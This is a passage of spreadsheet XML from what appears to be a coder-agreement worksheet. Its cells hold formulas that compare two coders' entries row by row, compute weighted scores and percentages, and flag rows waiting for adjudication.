        <f>IF(AND(Coder1!U204&amp;""&lt;&gt;"",Coder1!U204&amp;""=Coder2!U204&amp;""),Coder1!U204,"")</f>
        <v/>
      </c>
      <c r="V204" s="14">
        <f>IF(AND(Coder1!V204&amp;""&lt;&gt;"",Coder1!V204&amp;""=Coder2!V204&amp;""),Coder1!V204,"")</f>
        <v/>
      </c>
      <c r="W204" s="14">
        <f>IF(AND(Coder1!W204&amp;""&lt;&gt;"",Coder1!W204&amp;""=Coder2!W204&amp;""),Coder1!W204,"")</f>
        <v/>
      </c>
      <c r="X204" s="14">
        <f>IF(AND(Coder1!X204&amp;""&lt;&gt;"",Coder1!X204&amp;""=Coder2!X204&amp;""),Coder1!X204,"")</f>
        <v/>
      </c>
      <c r="Y204" s="14">
        <f>IF(AND(Coder1!Y204&amp;""&lt;&gt;"",Coder1!Y204&amp;""=Coder2!Y204&amp;""),Coder1!Y204,"")</f>
        <v/>
      </c>
      <c r="Z204" s="14">
        <f>IF(AND(Coder1!Z204&amp;""&lt;&gt;"",Coder1!Z204&amp;""=Coder2!Z204&amp;""),Coder1!Z204,"")</f>
        <v/>
      </c>
      <c r="AA204" s="14">
        <f>IF(AND(Coder1!AA204&amp;""&lt;&gt;"",Coder1!AA204&amp;""=Coder2!AA204&amp;""),Coder1!AA204,"")</f>
        <v/>
      </c>
      <c r="AB204" s="14">
        <f>IF(AND(Coder1!AB204&amp;""&lt;&gt;"",Coder1!AB204&amp;""=Coder2!AB204&amp;""),Coder1!AB204,"")</f>
        <v/>
      </c>
      <c r="AC204" s="14">
        <f>IF(AND(Coder1!AC204&amp;""&lt;&gt;"",Coder1!AC204&amp;""=Coder2!AC204&amp;""),Coder1!AC204,"")</f>
        <v/>
      </c>
      <c r="AD204" s="14">
        <f>IF(AND(Coder1!AD204&amp;""&lt;&gt;"",Coder1!AD204&amp;""=Coder2!AD204&amp;""),Coder1!AD204,"")</f>
        <v/>
      </c>
      <c r="AE204" s="14">
        <f>IF(AND(Coder1!AE204&amp;""&lt;&gt;"",Coder1!AE204&amp;""=Coder2!AE204&amp;""),Coder1!AE204,"")</f>
        <v/>
      </c>
      <c r="AF204" s="14">
        <f>IF(AND(Coder1!AF204&amp;""&lt;&gt;"",Coder1!AF204&amp;""=Coder2!AF204&amp;""),Coder1!AF204,"")</f>
        <v/>
      </c>
      <c r="AG204" s="14">
        <f>IF(AND(Coder1!AG204&amp;""&lt;&gt;"",Coder1!AG204&amp;""=Coder2!AG204&amp;""),Coder1!AG204,"")</f>
        <v/>
      </c>
      <c r="AH204" s="14">
        <f>IF(AND(Coder1!AH204&amp;""&lt;&gt;"",Coder1!AH204&amp;""=Coder2!AH204&amp;""),Coder1!AH204,"")</f>
        <v/>
      </c>
      <c r="AI204" s="11">
        <f>IF(COUNT(E204:L204)=0,"",SUM(E204:L204))</f>
        <v/>
      </c>
      <c r="AJ204" s="11">
        <f>IF(AI204="","",N(E204)*3+N(F204)*2+N(G204)*2+N(H204)*2+N(I204)*2+N(J204)*3+N(K204)*3+N(L204)*3)</f>
        <v/>
      </c>
      <c r="AK204" s="11">
        <f>IF(AI204="","",COUNTIF(N204:AG204,1))</f>
        <v/>
      </c>
      <c r="AL204" s="11">
        <f>IF(OR(AJ204="",AJ204=0),"",ROUND(100*(AJ204-AK204)/AJ204,1))</f>
        <v/>
      </c>
      <c r="AM204" s="11">
        <f>IF(AND(Coder1!AN204=1,Coder2!AN204=1),IF(COUNTBLANK(E204:AH204)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN204" s="11">
        <f>IF(AND(Coder1!AN204=1,Coder2!AN204=1),IF(SUMPRODUCT(--(Coder1!E204:AH204&amp;""&lt;&gt;Coder2!E204:AH204&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO204" s="11" t="n"/>
    </row>
    <row r="205">
      <c r="A205" s="11">
        <f>Coder1!A205</f>
        <v/>
      </c>
      <c r="B205" s="11">
        <f>Coder1!B205</f>
        <v/>
      </c>
      <c r="C205" s="11">
        <f>Coder1!C205</f>
        <v/>
      </c>
      <c r="D205" s="11">
        <f>Coder1!D205</f>
        <v/>
      </c>
      <c r="E205" s="14">
        <f>IF(AND(Coder1!E205&amp;""&lt;&gt;"",Coder1!E205&amp;""=Coder2!E205&amp;""),Coder1!E205,"")</f>
        <v/>
      </c>
      <c r="F205" s="14">
        <f>IF(AND(Coder1!F205&amp;""&lt;&gt;"",Coder1!F205&amp;""=Coder2!F205&amp;""),Coder1!F205,"")</f>
        <v/>
      </c>
      <c r="G205" s="14">
        <f>IF(AND(Coder1!G205&amp;""&lt;&gt;"",Coder1!G205&amp;""=Coder2!G205&amp;""),Coder1!G205,"")</f>
        <v/>
      </c>
      <c r="H205" s="14">
        <f>IF(AND(Coder1!H205&amp;""&lt;&gt;"",Coder1!H205&amp;""=Coder2!H205&amp;""),Coder1!H205,"")</f>
        <v/>
      </c>
      <c r="I205" s="14">
        <f>IF(AND(Coder1!I205&amp;""&lt;&gt;"",Coder1!I205&amp;""=Coder2!I205&amp;""),Coder1!I205,"")</f>
        <v/>
      </c>
      <c r="J205" s="14">
        <f>IF(AND(Coder1!J205&amp;""&lt;&gt;"",Coder1!J205&amp;""=Coder2!J205&amp;""),Coder1!J205,"")</f>
        <v/>
      </c>
      <c r="K205" s="14">
        <f>IF(AND(Coder1!K205&amp;""&lt;&gt;"",Coder1!K205&amp;""=Coder2!K205&amp;""),Coder1!K205,"")</f>
        <v/>
      </c>
      <c r="L205" s="14">
        <f>IF(AND(Coder1!L205&amp;""&lt;&gt;"",Coder1!L205&amp;""=Coder2!L205&amp;""),Coder1!L205,"")</f>
        <v/>
      </c>
      <c r="M205" s="14">
        <f>IF(AND(Coder1!M205&amp;""&lt;&gt;"",Coder1!M205&amp;""=Coder2!M205&amp;""),Coder1!M205,"")</f>
        <v/>
      </c>
      <c r="N205" s="14">
        <f>IF(AND(Coder1!N205&amp;""&lt;&gt;"",Coder1!N205&amp;""=Coder2!N205&amp;""),Coder1!N205,"")</f>
        <v/>
      </c>
      <c r="O205" s="14">
        <f>IF(AND(Coder1!O205&amp;""&lt;&gt;"",Coder1!O205&amp;""=Coder2!O205&amp;""),Coder1!O205,"")</f>
        <v/>
      </c>
      <c r="P205" s="14">
        <f>IF(AND(Coder1!P205&amp;""&lt;&gt;"",Coder1!P205&amp;""=Coder2!P205&amp;""),Coder1!P205,"")</f>
        <v/>
      </c>
      <c r="Q205" s="14">
        <f>IF(AND(Coder1!Q205&amp;""&lt;&gt;"",Coder1!Q205&amp;""=Coder2!Q205&amp;""),Coder1!Q205,"")</f>
        <v/>
      </c>
      <c r="R205" s="14">
        <f>IF(AND(Coder1!R205&amp;""&lt;&gt;"",Coder1!R205&amp;""=Coder2!R205&amp;""),Coder1!R205,"")</f>
        <v/>
      </c>
      <c r="S205" s="14">
        <f>IF(AND(Coder1!S205&amp;""&lt;&gt;"",Coder1!S205&amp;""=Coder2!S205&amp;""),Coder1!S205,"")</f>
        <v/>
      </c>
      <c r="T205" s="14">
        <f>IF(AND(Coder1!T205&amp;""&lt;&gt;"",Coder1!T205&amp;""=Coder2!T205&amp;""),Coder1!T205,"")</f>
        <v/>
      </c>
      <c r="U205" s="14">
        <f>IF(AND(Coder1!U205&amp;""&lt;&gt;"",Coder1!U205&amp;""=Coder2!U205&amp;""),Coder1!U205,"")</f>
        <v/>
      </c>
      <c r="V205" s="14">
        <f>IF(AND(Coder1!V205&amp;""&lt;&gt;"",Coder1!V205&amp;""=Coder2!V205&amp;""),Coder1!V205,"")</f>
        <v/>
      </c>
      <c r="W205" s="14">
        <f>IF(AND(Coder1!W205&amp;""&lt;&gt;"",Coder1!W205&amp;""=Coder2!W205&amp;""),Coder1!W205,"")</f>
        <v/>
      </c>
      <c r="X205" s="14">
        <f>IF(AND(Coder1!X205&amp;""&lt;&gt;"",Coder1!X205&amp;""=Coder2!X205&amp;""),Coder1!X205,"")</f>
        <v/>
      </c>
      <c r="Y205" s="14">
        <f>IF(AND(Coder1!Y205&amp;""&lt;&gt;"",Coder1!Y205&amp;""=Coder2!Y205&amp;""),Coder1!Y205,"")</f>
        <v/>
      </c>
      <c r="Z205" s="14">
        <f>IF(AND(Coder1!Z205&amp;""&lt;&gt;"",Coder1!Z205&amp;""=Coder2!Z205&amp;""),Coder1!Z205,"")</f>
        <v/>
      </c>
      <c r="AA205" s="14">
        <f>IF(AND(Coder1!AA205&amp;""&lt;&gt;"",Coder1!AA205&amp;""=Coder2!AA205&amp;""),Coder1!AA205,"")</f>
        <v/>
      </c>
      <c r="AB205" s="14">
        <f>IF(AND(Coder1!AB205&amp;""&lt;&gt;"",Coder1!AB205&amp;""=Coder2!AB205&amp;""),Coder1!AB205,"")</f>
        <v/>
      </c>
      <c r="AC205" s="14">
        <f>IF(AND(Coder1!AC205&amp;""&lt;&gt;"",Coder1!AC205&amp;""=Coder2!AC205&amp;""),Coder1!AC205,"")</f>
        <v/>
      </c>
      <c r="AD205" s="14">
        <f>IF(AND(Coder1!AD205&amp;""&lt;&gt;"",Coder1!AD205&amp;""=Coder2!AD205&amp;""),Coder1!AD205,"")</f>
        <v/>
      </c>
      <c r="AE205" s="14">
        <f>IF(AND(Coder1!AE205&amp;""&lt;&gt;"",Coder1!AE205&amp;""=Coder2!AE205&amp;""),Coder1!AE205,"")</f>
        <v/>
      </c>
      <c r="AF205" s="14">
        <f>IF(AND(Coder1!AF205&amp;""&lt;&gt;"",Coder1!AF205&amp;""=Coder2!AF205&amp;""),Coder1!AF205,"")</f>
        <v/>
      </c>
      <c r="AG205" s="14">
        <f>IF(AND(Coder1!AG205&amp;""&lt;&gt;"",Coder1!AG205&amp;""=Coder2!AG205&amp;""),Coder1!AG205,"")</f>
        <v/>
      </c>
      <c r="AH205" s="14">
        <f>IF(AND(Coder1!AH205&amp;""&lt;&gt;"",Coder1!AH205&amp;""=Coder2!AH205&amp;""),Coder1!AH205,"")</f>
        <v/>
      </c>
      <c r="AI205" s="11">
        <f>IF(COUNT(E205:L205)=0,"",SUM(E205:L205))</f>
        <v/>
      </c>
      <c r="AJ205" s="11">
        <f>IF(AI205="","",N(E205)*3+N(F205)*2+N(G205)*2+N(H205)*2+N(I205)*2+N(J205)*3+N(K205)*3+N(L205)*3)</f>
        <v/>
      </c>
      <c r="AK205" s="11">
        <f>IF(AI205="","",COUNTIF(N205:AG205,1))</f>
        <v/>
      </c>
      <c r="AL205" s="11">
        <f>IF(OR(AJ205="",AJ205=0),"",ROUND(100*(AJ205-AK205)/AJ205,1))</f>
        <v/>
      </c>
      <c r="AM205" s="11">
        <f>IF(AND(Coder1!AN205=1,Coder2!AN205=1),IF(COUNTBLANK(E205:AH205)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN205" s="11">
        <f>IF(AND(Coder1!AN205=1,Coder2!AN205=1),IF(SUMPRODUCT(--(Coder1!E205:AH205&amp;""&lt;&gt;Coder2!E205:AH205&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO205" s="11" t="n"/>
    </row>
    <row r="206">
      <c r="A206" s="11">
        <f>Coder1!A206</f>
        <v/>
      </c>
      <c r="B206" s="11">
        <f>Coder1!B206</f>
        <v/>
      </c>
      <c r="C206" s="11">
        <f>Coder1!C206</f>
        <v/>
      </c>
      <c r="D206" s="11">
        <f>Coder1!D206</f>
        <v/>
      </c>
      <c r="E206" s="14">
        <f>IF(AND(Coder1!E206&amp;""&lt;&gt;"",Coder1!E206&amp;""=Coder2!E206&amp;""),Coder1!E206,"")</f>
        <v/>
      </c>
      <c r="F206" s="14">
        <f>IF(AND(Coder1!F206&amp;""&lt;&gt;"",Coder1!F206&amp;""=Coder2!F206&amp;""),Coder1!F206,"")</f>
        <v/>
      </c>
      <c r="G206" s="14">
        <f>IF(AND(Coder1!G206&amp;""&lt;&gt;"",Coder1!G206&amp;""=Coder2!G206&amp;""),Coder1!G206,"")</f>
        <v/>
      </c>
      <c r="H206" s="14">
        <f>IF(AND(Coder1!H206&amp;""&lt;&gt;"",Coder1!H206&amp;""=Coder2!H206&amp;""),Coder1!H206,"")</f>
        <v/>
      </c>
      <c r="I206" s="14">
        <f>IF(AND(Coder1!I206&amp;""&lt;&gt;"",Coder1!I206&amp;""=Coder2!I206&amp;""),Coder1!I206,"")</f>
        <v/>
      </c>
      <c r="J206" s="14">
        <f>IF(AND(Coder1!J206&amp;""&lt;&gt;"",Coder1!J206&amp;""=Coder2!J206&amp;""),Coder1!J206,"")</f>
        <v/>
      </c>
      <c r="K206" s="14">
        <f>IF(AND(Coder1!K206&amp;""&lt;&gt;"",Coder1!K206&amp;""=Coder2!K206&amp;""),Coder1!K206,"")</f>
        <v/>
      </c>
      <c r="L206" s="14">
        <f>IF(AND(Coder1!L206&amp;""&lt;&gt;"",Coder1!L206&amp;""=Coder2!L206&amp;""),Coder1!L206,"")</f>
        <v/>
      </c>
      <c r="M206" s="14">
        <f>IF(AND(Coder1!M206&amp;""&lt;&gt;"",Coder1!M206&amp;""=Coder2!M206&amp;""),Coder1!M206,"")</f>
        <v/>
      </c>
      <c r="N206" s="14">
        <f>IF(AND(Coder1!N206&amp;""&lt;&gt;"",Coder1!N206&amp;""=Coder2!N206&amp;""),Coder1!N206,"")</f>
        <v/>
      </c>
      <c r="O206" s="14">
        <f>IF(AND(Coder1!O206&amp;""&lt;&gt;"",Coder1!O206&amp;""=Coder2!O206&amp;""),Coder1!O206,"")</f>
        <v/>
      </c>
      <c r="P206" s="14">
        <f>IF(AND(Coder1!P206&amp;""&lt;&gt;"",Coder1!P206&amp;""=Coder2!P206&amp;""),Coder1!P206,"")</f>
        <v/>
      </c>
      <c r="Q206" s="14">
        <f>IF(AND(Coder1!Q206&amp;""&lt;&gt;"",Coder1!Q206&amp;""=Coder2!Q206&amp;""),Coder1!Q206,"")</f>
        <v/>
      </c>
      <c r="R206" s="14">
        <f>IF(AND(Coder1!R206&amp;""&lt;&gt;"",Coder1!R206&amp;""=Coder2!R206&amp;""),Coder1!R206,"")</f>
        <v/>
      </c>
      <c r="S206" s="14">
        <f>IF(AND(Coder1!S206&amp;""&lt;&gt;"",Coder1!S206&amp;""=Coder2!S206&amp;""),Coder1!S206,"")</f>
        <v/>
      </c>
      <c r="T206" s="14">
        <f>IF(AND(Coder1!T206&amp;""&lt;&gt;"",Coder1!T206&amp;""=Coder2!T206&amp;""),Coder1!T206,"")</f>
        <v/>
      </c>
      <c r="U206" s="14">
        <f>IF(AND(Coder1!U206&amp;""&lt;&gt;"",Coder1!U206&amp;""=Coder2!U206&amp;""),Coder1!U206,"")</f>
        <v/>
      </c>
      <c r="V206" s="14">
        <f>IF(AND(Coder1!V206&amp;""&lt;&gt;"",Coder1!V206&amp;""=Coder2!V206&amp;""),Coder1!V206,"")</f>
        <v/>
      </c>
      <c r="W206" s="14">
        <f>IF(AND(Coder1!W206&amp;""&lt;&gt;"",Coder1!W206&amp;""=Coder2!W206&amp;""),Coder1!W206,"")</f>
        <v/>
      </c>
      <c r="X206" s="14">
        <f>IF(AND(Coder1!X206&amp;""&lt;&gt;"",Coder1!X206&amp;""=Coder2!X206&amp;""),Coder1!X206,"")</f>
        <v/>
      </c>
      <c r="Y206" s="14">
        <f>IF(AND(Coder1!Y206&amp;""&lt;&gt;"",Coder1!Y206&amp;""=Coder2!Y206&amp;""),Coder1!Y206,"")</f>
        <v/>
      </c>
      <c r="Z206" s="14">
        <f>IF(AND(Coder1!Z206&amp;""&lt;&gt;"",Coder1!Z206&amp;""=Coder2!Z206&amp;""),Coder1!Z206,"")</f>
        <v/>
      </c>
      <c r="AA206" s="14">
        <f>IF(AND(Coder1!AA206&amp;""&lt;&gt;"",Coder1!AA206&amp;""=Coder2!AA206&amp;""),Coder1!AA206,"")</f>
        <v/>
      </c>
      <c r="AB206" s="14">
        <f>IF(AND(Coder1!AB206&amp;""&lt;&gt;"",Coder1!AB206&amp;""=Coder2!AB206&amp;""),Coder1!AB206,"")</f>
        <v/>
      </c>
      <c r="AC206" s="14">
        <f>IF(AND(Coder1!AC206&amp;""&lt;&gt;"",Coder1!AC206&amp;""=Coder2!AC206&amp;""),Coder1!AC206,"")</f>
        <v/>
      </c>
      <c r="AD206" s="14">
        <f>IF(AND(Coder1!AD206&amp;""&lt;&gt;"",Coder1!AD206&amp;""=Coder2!AD206&amp;""),Coder1!AD206,"")</f>
        <v/>
      </c>
      <c r="AE206" s="14">
        <f>IF(AND(Coder1!AE206&amp;""&lt;&gt;"",Coder1!AE206&amp;""=Coder2!AE206&amp;""),Coder1!AE206,"")</f>
        <v/>
      </c>
      <c r="AF206" s="14">
        <f>IF(AND(Coder1!AF206&amp;""&lt;&gt;"",Coder1!AF206&amp;""=Coder2!AF206&amp;""),Coder1!AF206,"")</f>
        <v/>
      </c>
      <c r="AG206" s="14">
        <f>IF(AND(Coder1!AG206&amp;""&lt;&gt;"",Coder1!AG206&amp;""=Coder2!AG206&amp;""),Coder1!AG206,"")</f>
        <v/>
      </c>
      <c r="AH206" s="14">
        <f>IF(AND(Coder1!AH206&amp;""&lt;&gt;"",Coder1!AH206&amp;""=Coder2!AH206&amp;""),Coder1!AH206,"")</f>
        <v/>
      </c>
      <c r="AI206" s="11">
        <f>IF(COUNT(E206:L206)=0,"",SUM(E206:L206))</f>
        <v/>
      </c>
      <c r="AJ206" s="11">
        <f>IF(AI206="","",N(E206)*3+N(F206)*2+N(G206)*2+N(H206)*2+N(I206)*2+N(J206)*3+N(K206)*3+N(L206)*3)</f>
        <v/>
      </c>
      <c r="AK206" s="11">
        <f>IF(AI206="","",COUNTIF(N206:AG206,1))</f>
        <v/>
      </c>
      <c r="AL206" s="11">
        <f>IF(OR(AJ206="",AJ206=0),"",ROUND(100*(AJ206-AK206)/AJ206,1))</f>
        <v/>
      </c>
      <c r="AM206" s="11">
        <f>IF(AND(Coder1!AN206=1,Coder2!AN206=1),IF(COUNTBLANK(E206:AH206)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN206" s="11">
        <f>IF(AND(Coder1!AN206=1,Coder2!AN206=1),IF(SUMPRODUCT(--(Coder1!E206:AH206&amp;""&lt;&gt;Coder2!E206:AH206&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO206" s="11" t="n"/>
    </row>
    <row r="207">
      <c r="A207" s="11">
        <f>Coder1!A207</f>
        <v/>
      </c>
      <c r="B207" s="11">
        <f>Coder1!B207</f>
        <v/>
      </c>
      <c r="C207" s="11">
        <f>Coder1!C207</f>
        <v/>
      </c>
      <c r="D207" s="11">
        <f>Coder1!D207</f>
        <v/>
      </c>
      <c r="E207" s="14">
        <f>IF(AND(Coder1!E207&amp;""&lt;&gt;"",Coder1!E207&amp;""=Coder2!E207&amp;""),Coder1!E207,"")</f>
        <v/>
      </c>
      <c r="F207" s="14">
        <f>IF(AND(Coder1!F207&amp;""&lt;&gt;"",Coder1!F207&amp;""=Coder2!F207&amp;""),Coder1!F207,"")</f>
        <v/>
      </c>
      <c r="G207" s="14">
        <f>IF(AND(Coder1!G207&amp;""&lt;&gt;"",Coder1!G207&amp;""=Coder2!G207&amp;""),Coder1!G207,"")</f>
        <v/>
      </c>
      <c r="H207" s="14">
        <f>IF(AND(Coder1!H207&amp;""&lt;&gt;"",Coder1!H207&amp;""=Coder2!H207&amp;""),Coder1!H207,"")</f>
        <v/>
      </c>
      <c r="I207" s="14">
        <f>IF(AND(Coder1!I207&amp;""&lt;&gt;"",Coder1!I207&amp;""=Coder2!I207&amp;""),Coder1!I207,"")</f>
        <v/>
      </c>
      <c r="J207" s="14">
        <f>IF(AND(Coder1!J207&amp;""&lt;&gt;"",Coder1!J207&amp;""=Coder2!J207&amp;""),Coder1!J207,"")</f>
        <v/>
      </c>
      <c r="K207" s="14">
        <f>IF(AND(Coder1!K207&amp;""&lt;&gt;"",Coder1!K207&amp;""=Coder2!K207&amp;""),Coder1!K207,"")</f>
        <v/>
      </c>
      <c r="L207" s="14">
        <f>IF(AND(Coder1!L207&amp;""&lt;&gt;"",Coder1!L207&amp;""=Coder2!L207&amp;""),Coder1!L207,"")</f>
        <v/>
      </c>
      <c r="M207" s="14">
        <f>IF(AND(Coder1!M207&amp;""&lt;&gt;"",Coder1!M207&amp;""=Coder2!M207&amp;""),Coder1!M207,"")</f>
        <v/>
      </c>
      <c r="N207" s="14">
        <f>IF(AND(Coder1!N207&amp;""&lt;&gt;"",Coder1!N207&amp;""=Coder2!N207&amp;""),Coder1!N207,"")</f>
        <v/>
      </c>
      <c r="O207" s="14">
        <f>IF(AND(Coder1!O207&amp;""&lt;&gt;"",Coder1!O207&amp;""=Coder2!O207&amp;""),Coder1!O207,"")</f>
        <v/>
      </c>
      <c r="P207" s="14">
        <f>IF(AND(Coder1!P207&amp;""&lt;&gt;"",Coder1!P207&amp;""=Coder2!P207&amp;""),Coder1!P207,"")</f>
        <v/>
      </c>
      <c r="Q207" s="14">
        <f>IF(AND(Coder1!Q207&amp;""&lt;&gt;"",Coder1!Q207&amp;""=Coder2!Q207&amp;""),Coder1!Q207,"")</f>
        <v/>
      </c>
      <c r="R207" s="14">
        <f>IF(AND(Coder1!R207&amp;""&lt;&gt;"",Coder1!R207&amp;""=Coder2!R207&amp;""),Coder1!R207,"")</f>
        <v/>
      </c>
      <c r="S207" s="14">
        <f>IF(AND(Coder1!S207&amp;""&lt;&gt;"",Coder1!S207&amp;""=Coder2!S207&amp;""),Coder1!S207,"")</f>
        <v/>
      </c>
      <c r="T207" s="14">
        <f>IF(AND(Coder1!T207&amp;""&lt;&gt;"",Coder1!T207&amp;""=Coder2!T207&amp;""),Coder1!T207,"")</f>
        <v/>
      </c>
      <c r="U207" s="14">
        <f>IF(AND(Coder1!U207&amp;""&lt;&gt;"",Coder1!U207&amp;""=Coder2!U207&amp;""),Coder1!U207,"")</f>
        <v/>
      </c>
      <c r="V207" s="14">
        <f>IF(AND(Coder1!V207&amp;""&lt;&gt;"",Coder1!V207&amp;""=Coder2!V207&amp;""),Coder1!V207,"")</f>
        <v/>
      </c>
      <c r="W207" s="14">
        <f>IF(AND(Coder1!W207&amp;""&lt;&gt;"",Coder1!W207&amp;""=Coder2!W207&amp;""),Coder1!W207,"")</f>
        <v/>
      </c>
      <c r="X207" s="14">
        <f>IF(AND(Coder1!X207&amp;""&lt;&gt;"",Coder1!X207&amp;""=Coder2!X207&amp;""),Coder1!X207,"")</f>
        <v/>
      </c>
      <c r="Y207" s="14">
        <f>IF(AND(Coder1!Y207&amp;""&lt;&gt;"",Coder1!Y207&amp;""=Coder2!Y207&amp;""),Coder1!Y207,"")</f>
        <v/>
      </c>
      <c r="Z207" s="14">
        <f>IF(AND(Coder1!Z207&amp;""&lt;&gt;"",Coder1!Z207&amp;""=Coder2!Z207&amp;""),Coder1!Z207,"")</f>
        <v/>
      </c>
      <c r="AA207" s="14">
        <f>IF(AND(Coder1!AA207&amp;""&lt;&gt;"",Coder1!AA207&amp;""=Coder2!AA207&amp;""),Coder1!AA207,"")</f>
        <v/>
      </c>
      <c r="AB207" s="14">
        <f>IF(AND(Coder1!AB207&amp;""&lt;&gt;"",Coder1!AB207&amp;""=Coder2!AB207&amp;""),Coder1!AB207,"")</f>
        <v/>
      </c>
      <c r="AC207" s="14">
        <f>IF(AND(Coder1!AC207&amp;""&lt;&gt;"",Coder1!AC207&amp;""=Coder2!AC207&amp;""),Coder1!AC207,"")</f>
        <v/>
      </c>
      <c r="AD207" s="14">
        <f>IF(AND(Coder1!AD207&amp;""&lt;&gt;"",Coder1!AD207&amp;""=Coder2!AD207&amp;""),Coder1!AD207,"")</f>
        <v/>
      </c>
      <c r="AE207" s="14">
        <f>IF(AND(Coder1!AE207&amp;""&lt;&gt;"",Coder1!AE207&amp;""=Coder2!AE207&amp;""),Coder1!AE207,"")</f>
        <v/>
      </c>
      <c r="AF207" s="14">
        <f>IF(AND(Coder1!AF207&amp;""&lt;&gt;"",Coder1!AF207&amp;""=Coder2!AF207&amp;""),Coder1!AF207,"")</f>
        <v/>
      </c>
      <c r="AG207" s="14">
        <f>IF(AND(Coder1!AG207&amp;""&lt;&gt;"",Coder1!AG207&amp;""=Coder2!AG207&amp;""),Coder1!AG207,"")</f>
        <v/>
      </c>
      <c r="AH207" s="14">
        <f>IF(AND(Coder1!AH207&amp;""&lt;&gt;"",Coder1!AH207&amp;""=Coder2!AH207&amp;""),Coder1!AH207,"")</f>
        <v/>
      </c>
      <c r="AI207" s="11">
        <f>IF(COUNT(E207:L207)=0,"",SUM(E207:L207))</f>
        <v/>
      </c>
      <c r="AJ207" s="11">
        <f>IF(AI207="","",N(E207)*3+N(F207)*2+N(G207)*2+N(H207)*2+N(I207)*2+N(J207)*3+N(K207)*3+N(L207)*3)</f>
        <v/>
      </c>
      <c r="AK207" s="11">
        <f>IF(AI207="","",COUNTIF(N207:AG207,1))</f>
        <v/>
      </c>
      <c r="AL207" s="11">
        <f>IF(OR(AJ207="",AJ207=0),"",ROUND(100*(AJ207-AK207)/AJ207,1))</f>
        <v/>
      </c>
      <c r="AM207" s="11">
        <f>IF(AND(Coder1!AN207=1,Coder2!AN207=1),IF(COUNTBLANK(E207:AH207)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN207" s="11">
        <f>IF(AND(Coder1!AN207=1,Coder2!AN207=1),IF(SUMPRODUCT(--(Coder1!E207:AH207&amp;""&lt;&gt;Coder2!E207:AH207&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO207" s="11" t="n"/>
    </row>
    <row r="208">
      <c r="A208" s="11">
        <f>Coder1!A208</f>
        <v/>
      </c>
      <c r="B208" s="11">
        <f>Coder1!B208</f>
        <v/>
      </c>
      <c r="C208" s="11">
        <f>Coder1!C208</f>
        <v/>
      </c>
      <c r="D208" s="11">
        <f>Coder1!D208</f>
        <v/>
      </c>
      <c r="E208" s="14">
        <f>IF(AND(Coder1!E208&amp;""&lt;&gt;"",Coder1!E208&amp;""=Coder2!E208&amp;""),Coder1!E208,"")</f>
        <v/>
      </c>
      <c r="F208" s="14">
        <f>IF(AND(Coder1!F208&amp;""&lt;&gt;"",Coder1!F208&amp;""=Coder2!F208&amp;""),Coder1!F208,"")</f>
        <v/>
      </c>
      <c r="G208" s="14">
        <f>IF(AND(Coder1!G208&amp;""&lt;&gt;"",Coder1!G208&amp;""=Coder2!G208&amp;""),Coder1!G208,"")</f>
        <v/>
      </c>
      <c r="H208" s="14">
        <f>IF(AND(Coder1!H208&amp;""&lt;&gt;"",Coder1!H208&amp;""=Coder2!H208&amp;""),Coder1!H208,"")</f>
        <v/>
      </c>
      <c r="I208" s="14">
        <f>IF(AND(Coder1!I208&amp;""&lt;&gt;"",Coder1!I208&amp;""=Coder2!I208&amp;""),Coder1!I208,"")</f>
        <v/>
      </c>
      <c r="J208" s="14">
        <f>IF(AND(Coder1!J208&amp;""&lt;&gt;"",Coder1!J208&amp;""=Coder2!J208&amp;""),Coder1!J208,"")</f>
        <v/>
      </c>
      <c r="K208" s="14">
        <f>IF(AND(Coder1!K208&amp;""&lt;&gt;"",Coder1!K208&amp;""=Coder2!K208&amp;""),Coder1!K208,"")</f>
        <v/>
      </c>
      <c r="L208" s="14">
        <f>IF(AND(Coder1!L208&amp;""&lt;&gt;"",Coder1!L208&amp;""=Coder2!L208&amp;""),Coder1!L208,"")</f>
        <v/>
      </c>
      <c r="M208" s="14">
        <f>IF(AND(Coder1!M208&amp;""&lt;&gt;"",Coder1!M208&amp;""=Coder2!M208&amp;""),Coder1!M208,"")</f>
        <v/>
      </c>
      <c r="N208" s="14">
        <f>IF(AND(Coder1!N208&amp;""&lt;&gt;"",Coder1!N208&amp;""=Coder2!N208&amp;""),Coder1!N208,"")</f>
        <v/>
      </c>
      <c r="O208" s="14">
        <f>IF(AND(Coder1!O208&amp;""&lt;&gt;"",Coder1!O208&amp;""=Coder2!O208&amp;""),Coder1!O208,"")</f>
        <v/>
      </c>
      <c r="P208" s="14">
        <f>IF(AND(Coder1!P208&amp;""&lt;&gt;"",Coder1!P208&amp;""=Coder2!P208&amp;""),Coder1!P208,"")</f>
        <v/>
      </c>
      <c r="Q208" s="14">
        <f>IF(AND(Coder1!Q208&amp;""&lt;&gt;"",Coder1!Q208&amp;""=Coder2!Q208&amp;""),Coder1!Q208,"")</f>
        <v/>
      </c>
      <c r="R208" s="14">
        <f>IF(AND(Coder1!R208&amp;""&lt;&gt;"",Coder1!R208&amp;""=Coder2!R208&amp;""),Coder1!R208,"")</f>
        <v/>
      </c>
      <c r="S208" s="14">
        <f>IF(AND(Coder1!S208&amp;""&lt;&gt;"",Coder1!S208&amp;""=Coder2!S208&amp;""),Coder1!S208,"")</f>
        <v/>
      </c>
      <c r="T208" s="14">
        <f>IF(AND(Coder1!T208&amp;""&lt;&gt;"",Coder1!T208&amp;""=Coder2!T208&amp;""),Coder1!T208,"")</f>
        <v/>
      </c>
      <c r="U208" s="14">
        <f>IF(AND(Coder1!U208&amp;""&lt;&gt;"",Coder1!U208&amp;""=Coder2!U208&amp;""),Coder1!U208,"")</f>
        <v/>
      </c>
      <c r="V208" s="14">
        <f>IF(AND(Coder1!V208&amp;""&lt;&gt;"",Coder1!V208&amp;""=Coder2!V208&amp;""),Coder1!V208,"")</f>
        <v/>
      </c>
      <c r="W208" s="14">
        <f>IF(AND(Coder1!W208&amp;""&lt;&gt;"",Coder1!W208&amp;""=Coder2!W208&amp;""),Coder1!W208,"")</f>
        <v/>
      </c>
      <c r="X208" s="14">
